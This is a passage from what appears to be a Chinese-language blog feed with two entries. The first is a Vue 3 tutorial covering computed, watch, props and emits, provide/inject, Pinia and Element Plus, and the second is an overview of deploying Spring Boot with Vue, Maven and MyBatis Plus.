class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="computed"><a href="#computed" class="headerlink" title="computed"></a>computed</h4><p>计算属性</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;  </span><br><span class="line">import { computed, ref } from 'vue';  </span><br><span class="line">const list = ref([1,2,3,4,5,6,7,8]);  </span><br><span class="line">  </span><br><span class="line">// 调用函数  </span><br><span class="line">const logList = computed(() =&gt; {  </span><br><span class="line">    // return list.value.filter(item =&gt; item &gt; 3);  </span><br><span class="line">    return list.value.filter((item) =&gt; {return item &gt; 3}); </span><br><span class="line">});  </span><br><span class="line">&lt;/script&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;template&gt; </span><br><span class="line"> &lt;!--接收变量  --&gt;</span><br><span class="line">    &lt;p&gt;{{ list }}&lt;/p&gt;  </span><br><span class="line">    &lt;p&gt;{{ logList }}&lt;/p&gt;  </span><br><span class="line">&lt;/template&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;style scoped&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h4><p>监听器</p><p>基础监听器</p><p>检测到count值发生变化后控制台打印信息</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref,watch} from 'vue';''</span><br><span class="line">const count = ref(0)</span><br><span class="line">watch(count,(newValue,oldValue)=&gt;{</span><br><span class="line">  console.log(newValue,oldValue);</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click="count++" &gt;{{ count }}&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="侦听对象开启深度监听"><a href="#侦听对象开启深度监听" class="headerlink" title="侦听对象开启深度监听"></a>侦听对象开启深度监听</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">deep</span>:<span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref,watch} from 'vue';''</span><br><span class="line">const msg = ref({</span><br><span class="line">  const:0</span><br><span class="line">})</span><br><span class="line">watch(msg,(newValue,oldValue)=&gt;{</span><br><span class="line">  console.log(newValue,oldValue);</span><br><span class="line">},{</span><br><span class="line">  deep:true</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click="msg.const++" &gt;{{ msg.const }}&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="精确监听"><a href="#精确监听" class="headerlink" title="精确监听"></a>精确监听</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref,watch} from 'vue';''</span><br><span class="line">const msg = ref({</span><br><span class="line">  // 只监听const</span><br><span class="line">  const:0,</span><br><span class="line">  age:'cp'</span><br><span class="line">})</span><br><span class="line">watch(</span><br><span class="line">  // 精确监听某个属性</span><br><span class="line">  ()=&gt;msg.value.const,</span><br><span class="line">  (newValue,oldValue)=&gt;{</span><br><span class="line">    console.log(newValue,oldValue);</span><br><span class="line">  }</span><br><span class="line">)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click="msg.const++" &gt;{{ msg.const }}&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="生命周期onMounted"><a href="#生命周期onMounted" class="headerlink" title="生命周期onMounted"></a>生命周期onMounted</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { onMounted } from 'vue';</span><br><span class="line">onMounted(() =&gt; {</span><br><span class="line">  console.log('mounted1');</span><br><span class="line">});</span><br><span class="line">onMounted(() =&gt; {</span><br><span class="line">  console.log('mounted2');</span><br><span class="line">});</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;你好&lt;/h1&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="父传子"><a href="#父传子" class="headerlink" title="父传子"></a>父传子</h4><p>父组件</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">    //导入子组件</span><br><span class="line">import Soncon from './components/son-con.vue'</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;这是父组件&lt;/h1&gt;</span><br><span class="line">&lt;Soncon message="这是传给子组件的数据"&gt;&lt;/Soncon&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">// 编译器宏函数</span><br><span class="line">const props = defineProps({</span><br><span class="line">    // 因为setup生命周期太早所以需要使用defineProps编译器宏</span><br><span class="line">    message:String</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;这是子组件=={{ message }}&lt;/h1&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="使用props接收参数"><a href="#使用props接收参数" class="headerlink" title="使用props接收参数"></a>使用props接收参数</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> props = <span class="title function_">defineProps</span>({</span><br><span class="line">    <span class="comment">// 因为setup生命周期太早所以需要使用defineProps编译器宏</span></span><br><span class="line">    <span class="attr">message</span>:<span class="title class_">String</span></span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h4 id="子传父"><a href="#子传父" class="headerlink" title="子传父"></a>子传父</h4><p>父组件</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import Soncon from './components/son-con.vue'</span><br><span class="line">const getMessage = (mes)=&gt;{</span><br><span class="line">  console.log(mes);</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;这是父组件&lt;/h1&gt;</span><br><span class="line">&lt;Soncon message="这是传给子组件的数据" @get-message="getMessage"&gt;&lt;/Soncon&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">// 编译器宏函数</span><br><span class="line">    const props = defineProps({</span><br><span class="line">        // 因为setup生命周期太早所以需要使用defineProps编译器宏</span><br><span class="line">        message:String</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    const emit = defineEmits(['get-message'])</span><br><span class="line"></span><br><span class="line">    const show = ()=&gt;{</span><br><span class="line">        emit('get-message','子组件数据')</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1&gt;这是子组件=={{ message }}&lt;/h1&gt;</span><br><span class="line">&lt;button @click="show"&gt;按钮&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="获取Dom元素"><a href="#获取Dom元素" class="headerlink" title="获取Dom元素"></a>获取Dom元素</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import { ref,onMounted } from 'vue';</span><br><span class="line"></span><br><span class="line">const h1Ref = ref(null)</span><br><span class="line"></span><br><span class="line">// setup生命周期在早，页面未渲染直接输出不会显示</span><br><span class="line">// 所以换一个生命周期</span><br><span class="line">onMounted(()=&gt;{</span><br><span class="line">  console.log(h1Ref.value);</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h1 ref="h1Ref"&gt;这是根组件&lt;/h1&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="defineExpose"><a href="#defineExpose" class="headerlink" title="defineExpose"></a>defineExpose</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> msg = <span class="title function_">ref</span>(<span class="string">'hello world'</span>);</span><br><span class="line">       <span class="title function_">defineExpose</span>({</span><br><span class="line">           msg</span><br><span class="line">       })</span><br></pre></td></tr></tbody></table></figure><p>使用defineExpose再去获取Dom元素才能在跨层获取才能获取到数据</p><p><code>defineExpose</code> 是 Vue 3 中的一个特性，用于向父组件公开子组件的内部状态或方法。通过 <code>defineExpose</code>，子组件可以显式地公开需要暴露给父组件的属性或方法。</p><p>在上述代码中，我们使用 <code>defineExpose</code> 来向父组件暴露了一个名为 <code>msg</code> 的响应式数据。</p><p>下面是一个简单的示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// ChildComponent.vue</span></span><br><span class="line"><span class="keyword">import</span> { defineComponent, ref, defineExpose } <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>({</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">const</span> msg = <span class="title function_">ref</span>(<span class="string">'hello world'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">defineExpose</span>({</span><br><span class="line">        msg</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      msg</span><br><span class="line">    };</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">// ParentComponent.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ChildComponent ref="childComponent" /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import ChildComponent from './ChildComponent.vue';</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  mounted() {</span><br><span class="line">    console.log(this.$refs.childComponent.msg); // 输出: "hello world"</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，子组件通过 <code>defineExpose</code> 公开了 <code>msg</code> 这个数据，然后在父组件中通过 <code>$refs</code> 访问子组件并获取到了 <code>msg</code> 数据。</p><p>这种方式适用于需要在子组件中定义一些内部状态或方法，并且需要在父组件中进行访问或操作时。</p><h4 id="provide和inject"><a href="#provide和inject" class="headerlink" title="provide和inject"></a>provide和inject</h4><p>除了使用上述的方式来跨层传递数据还有一种更便捷的方法那就是provide创建数据和inject接收</p><p><code>provide</code> 和 <code>inject</code> 是 Vue 中用于在父组件和子组件之间跨层级传递数据的一种方式。<code>provide</code> 在父组件中创建数据，而 <code>inject</code> 则在子组件中接收这些数据。</p><p>在父组件中，通过 <code>provide</code> 来提供数据，子组件通过 <code>inject</code> 来注入这些数据。这种方式可以跨越多个嵌套层级，让数据在组件之间更方便地流动。</p><p>下面是一个简单的示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// ParentComponent.vue</span></span><br><span class="line"> <span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">   <span class="attr">provide</span>: {</span><br><span class="line">     <span class="attr">message</span>: <span class="string">'这是来自父组件的消息'</span></span><br><span class="line">   }</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// ChildComponent.vue</span></span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">    <span class="attr">inject</span>: [<span class="string">'message'</span>],</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>) {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">message</span>); <span class="comment">// 输出: "这是来自父组件的消息"</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>在这个例子中，父组件通过 <code>provide</code> 提供了一个名为 <code>message</code> 的数据，而子组件则通过 <code>inject</code> 注入了这个数据，并在 <code>mounted</code> 钩子中访问了这个数据。</p><p>这种方式比较方便，但需要注意的是，使用 <code>inject</code> 时要确保你知道提供数据的来源，以避免意外的耦合。</p><h4 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h4><p>在Vue3中使用ElementUI需要使用Element-plus</p><p>官网链接:<a href="https://element-plus.org/zh-CN/component/button.html">https://element-plus.org/zh-CN/component/button.html</a></p><p>在对应路径按照依赖</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm install element-plus --save</span><br></pre></td></tr></tbody></table></figure><p>也可以选择线上引入</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Import style --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"//unpkg.com/element-plus/dist/index.css"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Import Vue 3 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//unpkg.com/vue@3"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Import component library --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//unpkg.com/element-plus"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>详细参考官方文档</p><h3 id="Pinia"><a href="#Pinia" class="headerlink" title="Pinia"></a>Pinia</h3><p>官方文档:<a href="https://pinia.vuejs.org/zh/getting-started.html">https://pinia.vuejs.org/zh/getting-started.html</a></p><p>安装</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm cteate vue@latest <span class="comment">#安装最新vue3脚手架</span></span><br><span class="line">yarn add pinia</span><br><span class="line"><span class="comment"># 或者使用 npm</span></span><br><span class="line">npm install pinia</span><br></pre></td></tr></tbody></table></figure><h4 id="使用get接口获取数据"><a href="#使用get接口获取数据" class="headerlink" title="使用get接口获取数据"></a>使用get接口获取数据</h4><figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { defineStore } <span class="keyword">from</span> <span class="string">"pinia"</span>;</span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> { computed} <span class="keyword">from</span> <span class="string">'vue'</span>;  </span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span>;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCounterStore= <span class="title function_">defineStore</span>(<span class="string">'counter'</span>,<span class="function">()=&gt;</span>{</span><br><span class="line">    <span class="comment">//创建变量</span></span><br><span class="line">    <span class="keyword">const</span> count=<span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">// 创建响应式数组</span></span><br><span class="line">    <span class="keyword">const</span> arrayr = <span class="title function_">ref</span>([]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建计算属性</span></span><br><span class="line">    <span class="keyword">const</span> logList = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> {  </span><br><span class="line">      <span class="keyword">return</span> count.<span class="property">value</span> * <span class="number">2</span>; </span><br><span class="line">  });  </span><br><span class="line"><span class="comment">//创建方法</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">increment</span>=(<span class="params"></span>)=&gt;{-+</span><br><span class="line">        count.<span class="property">value</span>++</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取数据</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">fetchData</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {  </span><br><span class="line">        <span class="keyword">const</span> res = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">'http://geek.itheima.net/v1_0/channels'</span>);  </span><br><span class="line">        <span class="comment">// console.log(res.data.data.channels);</span></span><br><span class="line">        arrayr.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">channels</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'res'</span> + arrayr.<span class="property">value</span>);</span><br><span class="line">    };  </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//用对象的形式返回</span></span><br><span class="line">    <span class="comment">//所有方法和变量都需要返回，否则报错和接收不到</span></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        count,</span><br><span class="line">        logList,</span><br><span class="line">        increment,</span><br><span class="line">        <span class="comment">// 返回结果</span></span><br><span class="line">        fetchData,</span><br><span class="line">        arrayr,</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>组件展示数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import sPage from './components/store-page.vue'</span><br><span class="line">import sMsg from './components/store-msg.vue'</span><br><span class="line">//1、导入</span><br><span class="line">import { useCounterStore }from './stores/Counter'</span><br><span class="line">//2、执行方法</span><br><span class="line">const counterStore = useCounterStore()</span><br><span class="line">counterStore.fetchData()</span><br><span class="line"> console.log('hello:' + counterStore.arrayr);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;  </span><br><span class="line">    &lt;ul&gt;  </span><br><span class="line">      &lt;li v-for="item in counterStore.arrayr" :key="item.id"&gt;{{ item.name }}&lt;/li&gt;  </span><br><span class="line">    &lt;/ul&gt;  </span><br><span class="line">  &lt;/div&gt;  </span><br><span class="line">  &lt;button @click="counterStore.increment"&gt;这是按钮&lt;/button&gt;</span><br><span class="line">  &lt;h1&gt;这是父组件=={{ counterStore.count }}=={{ counterStore.logList}}&lt;/h1&gt;</span><br><span class="line">  &lt;sPage&gt;&lt;/sPage&gt;</span><br><span class="line">  &lt;sMsg&gt;&lt;/sMsg&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="pnpm"><a href="#pnpm" class="headerlink" title="pnpm"></a>pnpm</h3><p>全局安装</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">npm install -g pnpm</span><br></pre></td></tr></tbody></table></figure><p>使用pnpm创建Vue</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">pnpm create vue</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springboot+vue框架部署</title>
      <link href="/NANABLOG/2023/12/12/Springboot-vue%E6%A1%86%E6%9E%B6%E9%83%A8%E7%BD%B2/"/>
      <url>/NANABLOG/2023/12/12/Springboot-vue%E6%A1%86%E6%9E%B6%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/SpringBoot.png"></p><p>Spring Boot是一个用于构建Java应用程序的开发框架，它提供了快速开发、简化配置和自动化任务的特性。Vue.js是一个流行的JavaScript前端框架，用于构建交互式的用户界面。</p><p><strong>Spring Boot + Vue框架的优点：</strong></p><ol><li><strong>分离前后端开发</strong>：Spring Boot提供了强大的后端支持，而Vue.js则专注于构建交互式的前端界面，使得前后端开发可以相对独立进行。</li><li><strong>灵活性</strong>：Spring Boot的自动化配置和Vue.js的组件化开发使得系统更加灵活，易于维护和扩展。</li><li><strong>性能</strong>：Spring Boot具有快速启动和高性能的特点，而Vue.js采用虚拟DOM技术，提高了页面渲染效率，有利于提升系统的整体性能。</li><li><strong>生态系统</strong>：Spring Boot和Vue.js都拥有庞大的社区和丰富的生态系统，提供了大量的插件和组件，可以加速开发过程。</li></ol><p><strong>Spring Boot + Vue框架的缺点：</strong></p><ol><li><strong>学习曲线</strong>：对于新手来说，学习并掌握Spring Boot和Vue.js可能需要一定的时间和精力。</li><li><strong>复杂性</strong>：集成前后端框架需要一定的技术能力和经验，对开发人员的要求较高。</li></ol><p><strong>功能性：</strong></p><ol><li><strong>全栈开发</strong>：结合Spring Boot和Vue框架可以实现前后端分离的全栈开发，提高开发效率和灵活性。</li><li><strong>RESTful API</strong>：Spring Boot提供了便捷的RESTful API开发支持，与Vue的前端请求配合良好，实现数据的交互和展示。</li><li><strong>响应式页面</strong>：Vue框架可以实现响应式页面，使得前端页面的交互性和用户体验更加出色。</li></ol><p>总的来说，Spring Boot + Vue框架结合后能够提供一个高效、灵活和性能优越的全栈开发解决方案，但也需要开发人员具备一定的技术水平和经验。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>在部署Spring Boot和Vue框架时，可能会用到以下依赖和构建工具：</p><h4 id="依赖和构建工具"><a href="#依赖和构建工具" class="headerlink" title="依赖和构建工具"></a><strong>依赖和构建工具</strong></h4><ol><li><strong>Maven/Gradle</strong>：用于构建和管理Spring Boot后端应用程序的依赖关系，以及打包成可执行的JAR文件。</li><li><strong>Node.js</strong>：Vue框架依赖Node.js环境，在本地开发和构建Vue应用程序时需要安装Node.js。</li><li><strong>Vue CLI</strong>：Vue的官方构建工具，用于创建、构建和管理Vue应用程序，可以通过Vue CLI创建Vue项目，并利用其构建功能生成静态资源文件。</li><li><strong>Npm/Yarn</strong>：用于安装Vue项目中的依赖包，以及执行构建、打包等前端项目管理任务。</li><li><strong>Webpack</strong>：Vue CLI使用Webpack作为默认的打包工具，用于构建和打包Vue应用程序的静态资源。</li><li><strong>HTTP服务器</strong>（如Nginx、Apache等）：用于部署和提供Vue应用程序的静态资源，以及与后端应用程序进行通信。</li><li><strong>Java运行时环境（JRE）</strong>：在部署Spring Boot应用程序时，需要在目标服务器上安装适当版本的Java运行时环境。</li></ol><p>这些依赖和构建工具在整个部署过程中发挥着重要作用，它们可以帮助开发人员管理项目依赖、构建应用程序，并最终将应用程序部署到生产环境中。</p><p>本次部署过程是后端:Springboot负责前端控制器之间通信，前端:Vue页面渲染和element组件实现快速创建组件以及美化</p><p>mybatis负责连接数据库实现增删改查，用到了<strong>MyBatis Plus</strong></p><h4 id="MyBatis-Plus的一些主要特点"><a href="#MyBatis-Plus的一些主要特点" class="headerlink" title="MyBatis Plus的一些主要特点"></a>MyBatis Plus的一些主要特点</h4><ol><li><strong>简化CRUD操作</strong>：MyBatis Plus封装了通用的CRUD操作，简化了数据库操作的编写。</li><li><strong>代码生成器</strong>：MyBatis Plus提供了代码生成器，可以根据数据库表自动生成实体类、Mapper接口和XML映射文件，减少了开发人员的重复劳动。</li><li><strong>Lambda查询</strong>：MyBatis Plus支持使用Lambda表达式进行条件构造，提高了查询条件的可读性和灵活性。</li><li><strong>分页插件</strong>：MyBatis Plus提供了强大的分页插件，可以轻松实现分页查询功能。</li><li><strong>通用方法</strong>：MyBatis Plus提供了许多通用的方法，如批量插入、批量更新等，减少了开发人员的开发工作。</li><li><strong>逻辑删除</strong>：MyBatis Plus支持逻辑删除功能，可以方便地处理数据的逻辑删除操作。</li></ol><p>总的来说，MyBatis Plus是MyBatis的一个增强工具，它简化了数据库操作的编写，提高了开发效率，并提供了许多实用的功能和增强特性，使得基于MyBatis的开发更加便捷和高效。</p><p>最后是使用<strong>CodeGenerator</strong>实现快速创建前端控制器结构，和自动生成数据库相应的实体类</p><h4 id="CodeGenerator"><a href="#CodeGenerator" class="headerlink" title="CodeGenerator"></a>CodeGenerator</h4><p>CodeGenerator（代码生成器）通常是指一种工具或框架，用于根据预定义的模板和规则自动生成代码文件，以加速软件开发过程。代码生成器可以生成数据库访问层、业务逻辑层、API接口等代码，从而减少开发人员的重复性工作，提高开发效率。</p><p>一般情况下，代码生成器具有以下一些功能和特点：</p><ol><li><strong>模板定义</strong>：代码生成器通常会定义一些代码模板，用于生成特定编程语言的代码文件，这些模板可以包含预定义的结构、代码片段和规范。</li><li><strong>配置规则</strong>：开发人员可以通过配置文件或界面设定生成代码的规则，如指定数据表和字段对应的代码文件、命名规范、注释格式等。</li><li><strong>自动化生成</strong>：在配置好规则和模板后，代码生成器可以自动根据规则读取数据库结构，并生成对应的代码文件。</li><li><strong>灵活性</strong>：一些代码生成器提供了一定的灵活性，允许开发人员根据需要定制模板和规则，以满足特定的开发需求。</li><li><strong>集成性</strong>：代码生成器通常能够与主流的开发框架和工具集成，如与Spring框架、MyBatis、Hibernate等集成，以便生成符合特定框架标准的代码。</li></ol><p>总的来说，代码生成器是一种工具，可以根据预定义的规则和模板，自动生成特定编程语言的代码文件，从而提高开发效率，减少重复性工作，同时也有利于保持代码的一致性和规范性。</p><p>最后是依赖，使用了<strong>Maven</strong>框架管理和快速导入包</p><h4 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h4><p>是一个用于Java项目管理和构建的强大工具。它提供了一种标准化的方式来构建项目、管理项目依赖、运行单元测试、生成文档等。Maven使用基于项目对象模型（POM）的概念，通过XML文件来描述项目的结构和依赖关系。</p><p>Maven优点</p><ol><li><strong>标准化项目结构</strong>：Maven鼓励使用标准的项目结构，使得项目更易于维护、扩展和传递。</li><li><strong>依赖管理</strong>：Maven能够自动下载并管理项目所需的第三方依赖，简化了项目配置和构建过程。</li><li><strong>插件生态系统</strong>：Maven具有丰富的插件生态系统，可以扩展构建过程，实现自定义的操作和功能。</li><li><strong>生命周期管理</strong>：Maven定义了一套清晰的构建生命周期，包括编译、测试、打包、部署等阶段，使得构建过程更加可控。</li><li><strong>多模块支持</strong>：Maven能够轻松管理多模块项目，定义父子模块的依赖关系和继承关系。</li><li><strong>中央仓库</strong>：Maven中央仓库作为一个公共的资源库，能够提供大量的开源库供用户使用。</li></ol><p>Maven缺点</p><ol><li><strong>学习曲线</strong>：对于新手来说，Maven的概念和配置可能需要一定的学习成本。</li><li><strong>约定大于配置</strong>：Maven强制使用一些约定来标准化项目结构，有时候可能会限制一些自定义需求。</li><li><strong>性能</strong>：在下载依赖时，Maven可能会受到网络速度的影响，导致构建速度较慢。</li></ol><p>总的来说，Maven作为一个标准化的项目管理和构建工具，具有丰富的功能和插件生态，能够帮助开发人员管理和构建Java项目，但也需要开发人员花一定的时间学习和理解其概念和使用方法。</p><h4 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h4><p>Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库</p><p>官网:<a href="https://element.eleme.cn/#/zh-CN">https://element.eleme.cn/#/zh-CN</a></p><p>在写一些组件的时候,比如表格，输入框，按钮，可以使用组件一键复制粘贴，实现功能，既美观又使用，注意在使用前需要引入对应的css和js，可以在线引入也可以下载引入，这里提供在线引入的链接</p><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入样式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/element-ui/lib/theme-chalk/index.css"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入组件库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span 